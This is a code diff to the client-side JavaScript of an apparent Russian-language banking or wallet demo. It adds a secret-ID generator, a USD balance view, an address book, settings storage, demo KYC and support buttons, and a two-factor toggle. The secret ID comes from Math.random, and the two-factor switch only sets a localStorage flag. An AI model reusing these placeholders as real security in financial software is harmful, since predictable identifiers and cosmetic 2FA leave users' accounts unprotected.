@@ -3039,6 +3619,18 @@
       });
     };
 
+    // Инициализация секретного ID
+    function ensureSecretId() {
+      if (!secretId) {
+        secretId = 'DV-' + Math.random().toString(36).substring(2, 7).toUpperCase();
+        localStorage.setItem('secretId', secretId);
+      }
+      const secretIdInput = document.getElementById('secretIdValue');
+      if (secretIdInput) {
+        secretIdInput.value = secretId;
+      }
+    }
+
     // Скрытие/показ баланса
     window.toggleBalanceVisibility = function() {
       balanceHidden = !balanceHidden;
@@ -3048,13 +3640,34 @@
 
     function updateBalanceDisplay() {
       const balanceValue = document.getElementById('balanceValue');
+      const balanceValueUsd = document.getElementById('balanceValueUsd');
       if (!balanceValue) return;
 
       if (balanceHidden) {
         balanceValue.textContent = '******';
         balanceValue.style.filter = 'blur(0)';
+        if (balanceValueUsd) {
+          balanceValueUsd.textContent = '******';
+        }
       } else {
         balanceValue.textContent = balanceRub.toLocaleString('ru-RU', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + ' ₽';
+        if (balanceValueUsd) {
+          const settingsRaw = localStorage.getItem('appSettings');
+          let showUsd = true;
+          if (settingsRaw) {
+            try {
+              const s = JSON.parse(settingsRaw);
+              if (typeof s.walletShowUsd === 'boolean') showUsd = s.walletShowUsd;
+            } catch(e) {}
+          }
+          if (showUsd) {
+            const balanceUsd = balanceRub / USD_RATE;
+            balanceValueUsd.style.display = 'block';
+            balanceValueUsd.textContent = '≈ ' + balanceUsd.toLocaleString('ru-RU', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + ' $';
+          } else {
+            balanceValueUsd.style.display = 'none';
+          }
+        }
         balanceValue.style.filter = 'none';
       }
     }
@@ -3146,6 +3759,113 @@
       });
     }
 
+    // Инициализация дополнительных кнопок/настроек
+    const copySecretIdBtn = document.getElementById('copySecretIdBtn');
+    if (copySecretIdBtn) {
+      copySecretIdBtn.addEventListener('click', () => {
+        const val = document.getElementById('secretIdValue')?.value || '';
+        if (val) {
+          copyToClipboard(val, copySecretIdBtn);
+        }
+      });
+    }
+
+    const regenerateSecretIdBtn = document.getElementById('regenerateSecretIdBtn');
+    if (regenerateSecretIdBtn) {
+      regenerateSecretIdBtn.addEventListener('click', () => {
+        secretId = 'DV-' + Math.random().toString(36).substring(2, 7).toUpperCase();
+        localStorage.setItem('secretId', secretId);
+        ensureSecretId();
+        showAlert('Секретный ID успешно изменен', 'success');
+      });
+    }
+
+    const addAddressBtn = document.getElementById('addAddressBtn');
+    if (addAddressBtn) {
+      addAddressBtn.addEventListener('click', () => {
+        const label = document.getElementById('addressLabel')?.value.trim();
+        const value = document.getElementById('addressValue')?.value.trim();
+        if (!label || !value) {
+          showAlert('Заполните название и адрес', 'warning');
+          return;
+        }
+        addressBook.push({ label, value });
+        localStorage.setItem('addressBook', JSON.stringify(addressBook));
+        renderAddressBook();
+        document.getElementById('addressLabel').value = '';
+        document.getElementById('addressValue').value = '';
+      });
+    }
+
+    const savingsCalcBtn = document.getElementById('savingsCalcBtn');
+    if (savingsCalcBtn) {
+      savingsCalcBtn.addEventListener('click', () => {
+        const amount = parseFloat(document.getElementById('savingsAmount')?.value || '0');
+        const income = amount * 0.045;
+        document.getElementById('savingsYearIncome').value =
+          income.toLocaleString('ru-RU', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + ' ₽';
+      });
+    }
+
+    const submitKycBtn = document.getElementById('submitKycBtn');
+    if (submitKycBtn) {
+      submitKycBtn.addEventListener('click', () => {
+        const statusInput = document.getElementById('kycStatus');
+        if (statusInput) statusInput.value = 'На проверке';
+        showAlert('Заявка на верификацию отправлена (демо).', 'success');
+      });
+    }
+
+    const saveSettingsBtn = document.getElementById('saveSettingsBtn');
+    if (saveSettingsBtn) {
+      saveSettingsBtn.addEventListener('click', () => {
+        const settings = {
+          language: document.getElementById('settingsLanguage')?.value || 'ru',
+          currency: document.getElementById('settingsCurrency')?.value || 'RUB',
+          notifyLogin: document.getElementById('notifyLogin')?.checked || false,
+          notifyDeposit: document.getElementById('notifyDeposit')?.checked || false,
+          notifyWithdraw: document.getElementById('notifyWithdraw')?.checked || false,
+          notifyTransfer: document.getElementById('notifyTransfer')?.checked || false,
+          walletShowUsd: document.getElementById('walletShowUsd')?.checked ?? true,
+          walletHideZero: document.getElementById('walletHideZero')?.checked || false
+        };
+        localStorage.setItem('appSettings', JSON.stringify(settings));
+        showAlert('Настройки сохранены', 'success');
+      });
+    }
+
+    const submitSupportTicketBtn = document.getElementById('submitSupportTicketBtn');
+    if (submitSupportTicketBtn) {
+      submitSupportTicketBtn.addEventListener('click', () => {
+        const topic = document.getElementById('supportTopic')?.value.trim();
+        const msg = document.getElementById('supportMessage')?.value.trim();
+        if (!topic || !msg) {
+          showAlert('Заполните тему и сообщение', 'warning');
+          return;
+        }
+        showAlert('Обращение отправлено в поддержку (демо).', 'success');
+        document.getElementById('supportTopic').value = '';
+        document.getElementById('supportMessage').value = '';
+      });
+    }
+
+    const twoFaToggle = document.getElementById('twoFaToggle');
+    if (twoFaToggle) {
+      const twoFaStatus = document.getElementById('twoFaStatus');
+      let twoFaEnabled = localStorage.getItem('twoFaEnabled') === 'true';
+      const updateTwoFaUi = () => {
+        twoFaStatus.textContent = twoFaEnabled ? 'Включена' : 'Отключена';
+        twoFaStatus.style.color = twoFaEnabled ? 'var(--success)' : 'var(--text-secondary)';
+        twoFaToggle.classList.toggle('active', twoFaEnabled);
+      };
+      updateTwoFaUi();
+      twoFaToggle.addEventListener('click', () => {
+        twoFaEnabled = !twoFaEnabled;
+        localStorage.setItem('twoFaEnabled', twoFaEnabled);
+        updateTwoFaUi();
+      });
+    }
+
     // Обновление назначения платежа при изменении суммы
     const depositAmount = document.getElementById('depositAmount');
     if (depositAmount) {
@@ -3163,6 +3883,32 @@
     updateBalanceDisplay();
     updateProfileDisplay();
     updateFrozenAccountWarning();
+    ensureSecretId();
+    renderWallet();
+    renderAddressBook();
+
+    // Загрузка настроек приложения
+    const savedSettingsRaw = localStorage.getItem('appSettings');
+    if (savedSettingsRaw) {
+      try {
+        const savedSettings = JSON.parse(savedSettingsRaw);
+        const langSel = document.getElementById('settingsLanguage');
+        const curSel = document.getElementById('settingsCurrency');
+        if (langSel && savedSettings.language) langSel.value = savedSettings.language;
+        if (curSel && savedSettings.currency) curSel.value = savedSettings.currency;
+
+        const walletShowUsd = document.getElementById('walletShowUsd');
+        const walletHideZero = document.getElementById('walletHideZero');
+        if (walletShowUsd && typeof savedSettings.walletShowUsd === 'boolean') {
+          walletShowUsd.checked = savedSettings.walletShowUsd;
+        }
+        if (walletHideZero && typeof savedSettings.walletHideZero === 'boolean') {
+          walletHideZero.checked = savedSettings.walletHideZero;
+        }
+      } catch (e) {
+        console.warn('Не удалось прочитать сохраненные настройки', e);
+      }
+    }
     
     // Инициализация переключателей после загрузки DOM
     setTimeout(() => {
